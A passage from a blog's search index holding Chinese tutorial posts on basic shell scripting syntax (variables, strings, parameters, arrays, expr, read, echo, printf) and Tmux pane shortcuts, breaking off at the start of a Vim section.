<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Shell 语法</title>
      <link href="/post/4ac46ed0.html/"/>
      <url>/post/4ac46ed0.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一，Shell-脚本"><a href="#一，Shell-脚本" class="headerlink" title="一，Shell 脚本"></a>一，Shell 脚本</h1><p>Shell 脚本（shell script），是一种为 shell 编写的脚本程序。</p><h2 id="第一个shell脚本"><a href="#第一个shell脚本" class="headerlink" title="第一个shell脚本"></a>第一个shell脚本</h2><blockquote><p>打开文本编辑器(使用 <code>vi/vim</code> 命令来创建文件)，<br>新建一个文件 <code>test.sh</code>，扩展名为 <code>sh</code>（ <code>sh</code> 代表 <code>shell</code> ），<br>扩展名并不影响脚本执行，见名知意就好，<br>如果你用 <code>php</code> 写 <code>shell</code> 脚本，扩展名就用 <code>php</code> </p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello World !&quot;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/try/showbash.php?filename=helloworld">运行实例 »</a></p><p><code>#!</code>是一个约定的标记，它告诉系统这个脚本需要什么解释器来执行，即使用哪一种 Shell。</p><p>echo 命令用于向窗口输出文本。</p><h3 id="运行-Shell-脚本有两种方法："><a href="#运行-Shell-脚本有两种方法：" class="headerlink" title="运行 Shell 脚本有两种方法："></a>运行 Shell 脚本有两种方法：</h3><p><strong>1、作为可执行程序</strong></p><p>将上面的代码保存为 test.sh，并 cd 到相应目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x ./test.sh  <span class="comment">#使脚本具有执行权限</span></span><br><span class="line">./test.sh  <span class="comment">#执行脚本</span></span><br></pre></td></tr></table></figure><p><strong>2、作为解释器参数</strong></p><p>这种运行方式是，直接运行解释器，其参数就是 shell 脚本的文件名，如：<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash text.<span class="keyword">sh</span></span><br><span class="line">/bin/<span class="keyword">sh</span> <span class="keyword">test</span>.<span class="keyword">sh</span></span><br><span class="line">/bin/php <span class="keyword">test</span>.php</span><br></pre></td></tr></table></figure></p><h1 id="二-Shell-变量"><a href="#二-Shell-变量" class="headerlink" title="二. Shell 变量"></a>二. Shell 变量</h1><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">Shell 注释</button></li><li class="tab"><button type="button" data-href="#-2">定义变量</button></li><li class="tab"><button type="button" data-href="#-3">使用变量</button></li><li class="tab"><button type="button" data-href="#-4">只读变量</button></li><li class="tab"><button type="button" data-href="#-5">删除变量</button></li><li class="tab"><button type="button" data-href="#-6">变量类型</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><p>以 # 开头的行就是注释，会被解释器忽略。</p><p>通过每一行加一个 <strong>#</strong> 号设置多行注释，</p><h3 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h3><p>多行注释还可以使用以下格式：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">:&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">EOF 也可以使用其他符号:</span><br><span class="line"></span><br><span class="line">:&lt;&lt;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line">:&lt;&lt;!</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">!</span><br></pre></td></tr></table></figure></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><blockquote><p>定义变量，不需要加<code>$</code>符号，例如：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name1=<span class="string">&#x27;daming&#x27;</span>   <span class="comment"># 单引号定义字符串</span></span><br><span class="line">name2=<span class="string">&quot;daming&quot;</span>   <span class="comment"># 双引号定义字符串</span></span><br><span class="line">name3=daming     <span class="comment"># 也可以不加引号，同样表示字符串 </span></span><br></pre></td></tr></table></figure><p>单引号字符串的限制：</p><ul><li>单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的；</li><li>单引号字串中不能出现单独一个的单引号（对单引号使用转义符后也不行），但可成对出现，作为字符串拼接使用。</li></ul><p>双引号的优点：</p><ul><li>双引号里可以有变量</li><li>双引号里可以出现转义字符</li></ul><h3 id="拼接字符串"><a href="#拼接字符串" class="headerlink" title="拼接字符串"></a>拼接字符串</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">your_name=<span class="string">&quot;runoob&quot;</span></span><br><span class="line">\<span class="comment"># 使用双引号拼接</span></span><br><span class="line">greeting=<span class="string">&quot;hello, &quot;</span><span class="variable">$your_name</span><span class="string">&quot; !&quot;</span></span><br><span class="line">greeting_1=<span class="string">&quot;hello, <span class="variable">$&#123;your_name&#125;</span> !&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$greeting</span> <span class="variable">$greeting_1</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># 使用单引号拼接</span></span><br><span class="line">greeting_2=<span class="string">&#x27;hello, &#x27;</span><span class="variable">$your_name</span><span class="string">&#x27; !&#x27;</span></span><br><span class="line">greeting_3=<span class="string">&#x27;hello, $&#123;your_name&#125; !&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$greeting_2</span> <span class="variable">$greeting_3</span></span><br></pre></td></tr></table></figure><p>输出结果为：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello, runoob ! hello, runoob !</span><br><span class="line">hello, runoob ! hello, <span class="variable">$&#123;your_name&#125;</span> !</span><br></pre></td></tr></table></figure></p><h3 id="获取字符串长度"><a href="#获取字符串长度" class="headerlink" title="获取字符串长度"></a>获取字符串长度</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string=<span class="string">&quot;abcd&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string&#125;</span>  <span class="comment"># 输出 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量为字符串时，$&#123;#string&#125; 等价于 $&#123;#string[0]&#125;:</span></span><br><span class="line"></span><br><span class="line">string=<span class="string">&quot;abcd&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string[0]&#125;</span>  <span class="comment"># 输出 4</span></span><br></pre></td></tr></table></figure><h3 id="提取子字符串"><a href="#提取子字符串" class="headerlink" title="提取子字符串"></a>提取子字符串</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string=<span class="string">&quot;runoob is a great site&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;string:1:4&#125;</span> <span class="comment"># 输出 unoo</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：第一个字符的索引值为 <strong>0</strong>。</p><h3 id="查找子字符串"><a href="#查找子字符串" class="headerlink" title="查找子字符串"></a>查找子字符串</h3><ul><li>查找字符 i 或 o 的位置(哪个字母先出现就计算哪个)：<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string=<span class="string">&quot;runoob is a great site&quot;</span></span><br><span class="line"><span class="built_in">echo</span> `<span class="built_in">expr</span> index <span class="string">&quot;<span class="variable">$string</span>&quot;</span> io` <span class="comment"># 输出 4</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>注意：</strong> 以上脚本中 ` 是反引号，而不是单引号 ‘，不要看错了哦。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><p>使用一个定义过的变量，只要在变量名前面加美元符号<code>$</code>即可，如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">your_name=<span class="string">&quot;qinjx&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$your_name</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;your_name&#125;</span></span><br></pre></td></tr></table></figure><p>变量名外面的花括号是可选的，加不加都行，加花括号是为了帮助解释器识别变量的边界，比如下面这种情况：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> skill <span class="keyword">in</span> Ada Coffe Action Java; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;I am good at <span class="variable">$&#123;skill&#125;</span>Script&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><br>如果不给skill变量加花括号，写成<code>echo &quot;I am good at $skillScript&quot;</code>，解释器就会把<code>$skillScript</code>当成一个变量（其值为空），代码执行结果就不是我们期望的样子了。</p><p>推荐给所有变量加上花括号，这是个好的编程习惯。</p><ul><li>已定义的变量，可以被重新定义</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-4"><p>使用<code>readonly</code>或者<code>declare</code>可以将变量变为只读。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name=lkj</span><br><span class="line"><span class="built_in">readonly</span> <span class="variable">$name</span></span><br><span class="line"><span class="built_in">declare</span> -r name <span class="comment"># 两种写法均可</span></span><br><span class="line"></span><br><span class="line">name=abc    <span class="comment">#会报错，因为此时name只读</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-5"><p>使用 unset 命令可以删除变量。语法：</p><p><code>unset variable_name</code><br>变量被删除后不能再次使用。unset 命令不能删除只读变量。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">myUrl=<span class="string">&quot;https://chalnl.com&quot;</span></span><br><span class="line"><span class="built_in">unset</span> myUrl</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$myUrl</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-6"><p>运行shell时，会同时存在三种变量：</p><p>1) <strong>局部变量</strong> 局部变量在脚本或命令中定义，仅在当前shell实例中有效，其他shell启动的程序不能访问局部变量。<br>2) <strong>环境变量</strong> 所有的程序，包括shell启动的程序，都能访问环境变量，有些程序需要环境变量来保证其正常运行。必要的时候shell脚本也可以定义环境变量。<br>3) <strong>shell变量</strong> shell变量是由shell程序设置的特殊变量。shell变量中有一部分是环境变量，有一部分是局部变量，这些变量保证了shell的正常运行</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="三，Shell-语法"><a href="#三，Shell-语法" class="headerlink" title="三，Shell 语法"></a>三，Shell 语法</h1><h2 id="Shell-传递参数"><a href="#Shell-传递参数" class="headerlink" title="Shell 传递参数"></a>Shell 传递参数</h2><p>我们可以在执行 Shell 脚本时，向脚本传递参数，脚本内获取参数的格式为：<strong>$n</strong>。<strong>n</strong> 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推……</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Shell 传递参数实例！&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;执行的文件名：&quot;</span><span class="variable">$0</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数为：&quot;</span><span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个参数为：&quot;</span><span class="variable">$2</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第三个参数为：&quot;</span><span class="variable">$3</span></span><br></pre></td></tr></table></figure><p>为脚本设置可执行权限，并执行脚本，输出结果如下所示：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x test.sh </span><br><span class="line">$ ./test.sh 1 2 3</span><br></pre></td></tr></table></figure><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Shell 传递参数实例！</span><br><span class="line">执行的文件名：./test.sh</span><br><span class="line">第一个参数为：1</span><br><span class="line">第二个参数为：2</span><br><span class="line">第三个参数为：3</span><br></pre></td></tr></table></figure><br>另外，还有几个特殊字符用来处理参数：</p><div class="table-container"><table><thead><tr><th>参数处理</th><th>说明</th></tr></thead><tbody><tr><td>$#</td><td>传递到脚本的参数个数,如上例中值为 3</td></tr><tr><td>$*</td><td>由所有参数构成的用空格隔开的字符串，如上例中值为 <code>&quot;$1 $2 $3&quot;</code></td></tr><tr><td>$@</td><td>但是使用时加引号，并在引号中返回每个参数。 如上例中值为    <code>&quot;$1&quot; &quot;$2&quot; &quot;$3&quot;</code></td></tr><tr><td>$$</td><td>脚本运行的当前进程ID号</td></tr><tr><td><strong>$?</strong></td><td>显示最后命令的退出状态（注意不是stdout，而是 exit code ）。0表示正常退出，其他值表明有错误。</td></tr><tr><td><code>$(command)</code></td><td>返回<code>command</code>这条命令的 stdout</td></tr><tr><td><code>`command` </code></td><td>返回<code>command</code>这条命令的 stdout</td></tr></tbody></table></div><h2 id="Shell-数组"><a href="#Shell-数组" class="headerlink" title="Shell 数组"></a>Shell 数组</h2><blockquote><p>数组中可以存放多个值。Bash Shell 只支持一维数组（不支持多维数组），初始化时不需要定义数组大小（与 PHP 类似）。</p><p>与大部分编程语言类似，数组元素的下标由 0 开始。</p><p>Shell 数组用括号来表示，元素用”空格”符号分割开</p></blockquote><ul><li><strong>数组定义 读取：</strong><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一种方法定义</span></span><br><span class="line">my_array=(A B <span class="string">&quot;C&quot;</span> D)</span><br><span class="line"><span class="comment"># 第二种方法定义</span></span><br><span class="line">array_name[0]=value0</span><br><span class="line">array_name[1]=value1</span><br><span class="line">array_name[2]=value2</span><br><span class="line"><span class="comment"># 读取输出</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个元素为: <span class="variable">$&#123;my_array[0]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个元素为: <span class="variable">$&#123;my_array[1]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第三个元素为: <span class="variable">$&#123;my_array[2]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第四个元素为: <span class="variable">$&#123;my_array[3]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="expr-表达式"><a href="#expr-表达式" class="headerlink" title="expr [表达式]"></a><code>expr [表达式]</code></h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">val=`<span class="built_in">expr</span> 2 + 2`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;两数之和为 : <span class="variable">$val</span>&quot;</span></span><br></pre></td></tr></table></figure><p>两点注意：</p><ul><li>表达式和运算符之间要有空格，例如 2+2 是不对的，必须写成 2 + 2，这与我们熟悉的大多数编程语言不一样。</li><li>完整的表达式要被 <code>` ` </code>包含，注意这个字符不是常用的单引号，在 Esc 键下边。</li></ul><h3 id="字符串表达式"><a href="#字符串表达式" class="headerlink" title="字符串表达式"></a>字符串表达式</h3><p><code>linux expr</code>对字符串的用法</p><ol><li><p>获取字符串的长度</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">expr</span> length <span class="string">&quot;字符串&quot;</span></span><br><span class="line"><span class="built_in">expr</span> <span class="string">&quot;字符串&quot;</span> : <span class="string">&quot;.*&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>查找字符串首次出现的位置</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">expr</span> index <span class="string">&quot;源字符串&quot;</span> <span class="string">&quot;子字符串&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>从字符串的某个位置开始提取字符串</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">expr</span> substr <span class="string">&quot;源字符串&quot;</span> 开始位置(从1开始计算) 提取的长度</span><br></pre></td></tr></table></figure></li></ol><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>下表列出了常用的算术运算符，假定变量 a 为 10，变量 b 为 20：</p><div class="table-container"><table><thead><tr><th>运算符</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>+</td><td>加法</td><td><code>expr $a + $b</code> 结果为 30。</td></tr><tr><td>-</td><td>减法</td><td><code>expr $a - $b</code> 结果为 -10。</td></tr><tr><td>*</td><td>乘法</td><td><code>expr $a \* $b</code> 结果为  200。</td></tr><tr><td>/</td><td>除法</td><td><code>expr $b / $a</code> 结果为 2。</td></tr><tr><td>%</td><td>取余</td><td><code>expr $b % $a</code> 结果为 0。</td></tr><tr><td>=</td><td>赋值</td><td>a=$b 把变量 b 的值赋给 a。</td></tr><tr><td>==</td><td>相等。用于比较两个数字，相同则返回 true。</td><td>[ $a == $b ] 返回 false。</td></tr><tr><td>!=</td><td>不相等。用于比较两个数字，不相同则返回 true。</td><td>[ $a != $b ] 返回 true。</td></tr></tbody></table></div><p><strong>注意:</strong> 条件表达式要放在方括号之间，并且要有空格，例如: <strong>[$a==$b]</strong> 是错误的，必须写成 <strong>[ $a == $b ]</strong>。</p><h2 id="read-命令"><a href="#read-命令" class="headerlink" title="read 命令"></a>read 命令</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># -p 可以加提示信息</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;What`s your name?&quot;</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># -t 可以加等待时间 下例是等待五秒钟</span></span><br><span class="line"><span class="built_in">read</span> -t 5 name </span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> Hello,<span class="variable">$name</span></span><br></pre></td></tr></table></figure><h2 id="echo命令"><a href="#echo命令" class="headerlink" title="echo命令"></a><code>echo</code>命令</h2><p>Shell 的 echo 指令与 PHP 的 echo 指令类似，都是用于字符串的输出。<br>1.显示变量<br>read 命令从标准输入中读取一行,并把输入行的每个字段的值指定给 shell 变量<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">read</span> name </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$name</span> It is a test&quot;</span></span><br><span class="line"><span class="comment">#以上代码保存为 test.sh，name 接收标准输入的变量，结果将是:</span></span><br><span class="line">[root@www ~]<span class="comment"># sh test.sh</span></span><br><span class="line">OK                     <span class="comment">#标准输入</span></span><br><span class="line">OK It is a <span class="built_in">test</span>        <span class="comment">#输出</span></span><br></pre></td></tr></table></figure><br>2.换行<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;OK! \n&quot;</span> <span class="comment"># -e 开启转义</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;It is a test&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;OK! \c&quot;</span> <span class="comment"># -e 开启转义 \c 不换行</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;It is a test&quot;</span></span><br></pre></td></tr></table></figure><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OK!</span><br><span class="line">It is a <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">OK! It is a <span class="built_in">test</span></span><br></pre></td></tr></table></figure></p><p>3.显示结果定向至文件<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;It is a test&quot;</span> &gt; myfile</span><br></pre></td></tr></table></figure></p><p>4.显示命令执行时间<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> `<span class="built_in">date</span>`</span><br><span class="line"><span class="comment"># **注意：** 这里使用的是反引号 `, 而不是单引号 &#x27;。</span></span><br><span class="line"><span class="comment"># 结果将显示当前日期</span></span><br><span class="line">Thu Jul 24 10:08:46 CST 2014</span><br></pre></td></tr></table></figure></p><h2 id="printf命令"><a href="#printf命令" class="headerlink" title="printf命令"></a><code>printf</code>命令</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%10d!\n&quot;</span> 123      <span class="comment"># 占10位 右对齐</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10.2f!\n&quot;</span> 123.1321   <span class="comment"># 占10位，保留2位小数，左对齐</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;My name is %s\n&quot;</span> <span class="string">&quot;mmm&quot;</span> <span class="comment"># 格式化输出字符串</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%d * %d = %d\n&quot;</span> 2 3 `<span class="built_in">expr</span> 2 \* 3` <span class="comment"># 表示式的值作为参数</span></span><br></pre></td></tr></table></figure><p>输出结果<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">       123!</span><br><span class="line">123.13    !</span><br><span class="line">My name is mmm</span><br><span class="line">2 * 3 = 6</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Linux 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tmux and Vim</title>
      <link href="/post/4137f9a5.html/"/>
      <url>/post/4137f9a5.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Tmux"><a href="#Tmux" class="headerlink" title="Tmux"></a>Tmux</h1><blockquote><p>session{window1{pane1,pane2,pane3},window2,window3}</p></blockquote><h2 id="Tmux-作用"><a href="#Tmux-作用" class="headerlink" title="Tmux 作用"></a>Tmux 作用</h2><blockquote><p>划分窗口 + 对话存储</p><p>（1）它允许在单个窗口中，同时访问多个会话。这对于同时运行多个命令行程序很有用。<br>（2） 它可以让新窗口”接入”已经存在的会话。<br>（3）它允许每个会话有多个连接窗口，因此可以多人实时共享会话。<br>（4）它还支持窗口任意的垂直和水平拆分。</p></blockquote><h3 id="划分窗口"><a href="#划分窗口" class="headerlink" title="划分窗口"></a>划分窗口</h3><blockquote><p>划分上下两个窗格<br>快捷键: <strong>Ctrl + b +  “</strong><br>命令建: <code>$ tmux split-window</code></p><p>划分左右两个窗格<br>快捷键: <strong>Ctrl + b + %</strong><br>命令建: <code>$ tmux split-window -h</code></p><p>关闭当前窗口<br>快捷键: <strong>Ctrl + d</strong></p><p>返回窗口 <strong>Crtl + b d</strong><br>返回 tmux 窗口 <code>tmux a</code></p></blockquote><div class="table-container"><table><thead><tr><th>快捷键</th><th>作用</th></tr></thead><tbody><tr><td><strong>Ctrl+b %</strong></td><td>划分左右两个窗格</td></tr><tr><td><strong>Ctrl+b “</strong></td><td>划分上下两个窗格</td></tr><tr><td><strong>Ctrl+b + arrow key</strong></td><td>光标切换到其他窗格。<arrow key>是指向要切换到的窗格的方向键，比如切换到下方窗格，就按方向键↓</td></tr><tr><td><strong>Ctrl+b PgUp</strong></td><td>向上翻页</td></tr><tr><td><strong>Ctrl+b PgDn</strong></td><td>向下翻页</td></tr><tr><td><strong>Ctrl+b {</strong></td><td>当前窗格与上一个窗格交换位置。</td></tr><tr><td><strong>Ctrl+b }</strong></td><td>当前窗格与下一个窗格交换位置</td></tr><tr><td>Ctrl+b Ctrl+o</td><td>所有窗格向前移动一个位置，第一个窗格变成最后一个窗格</td></tr><tr><td>Ctrl+b Alt+o</td><td>所有窗格向后移动一个位置，最后一个窗格变成第一个窗格</td></tr><tr><td>Ctrl+b x</td><td>关闭当前窗格</td></tr><tr><td>Ctrl+b !</td><td>将当前窗格拆分为一个独立窗口</td></tr><tr><td><strong>Ctrl+b z</strong></td><td>当前窗格全屏显示，再使用一次会变回原来大小</td></tr><tr><td><strong>Ctrl + b + arrow key</strong></td><td>按箭头方向调整窗格大小</td></tr><tr><td><strong>Ctrl+b q</strong></td><td>显示窗格编号</td></tr></tbody></table></div><hr><h1 id="Vi-Vim"><a href="#Vi-Vim" class="headerlink" title="Vi/Vim"></a>Vi/Vim</h1><h2 id="什么是-vim？"><a href="#什么是-vim？" class="headerlink" title="什么是 vim？"></a>什么是 vim？</h2><blockquote><p>vim : Linux 中的文本编辑器 ，一般在 <code>Tmux</code> 中打开，不小心断网之后内容不会丢掉。</p></blockquote><p>vim 具有程序编辑的能力，可以主动的以字体颜色辨别语法的正确性，方便程序设计。</p><p>相关文章：<a href="https://www.runoob.com/w3cnote/all-vim-cheatsheat.html">史上最全Vim快捷键键位图 ——— 入门到进阶</a></p><h2 id="vim-键盘图："><a href="#vim-键盘图：" class="headerlink" title="vim 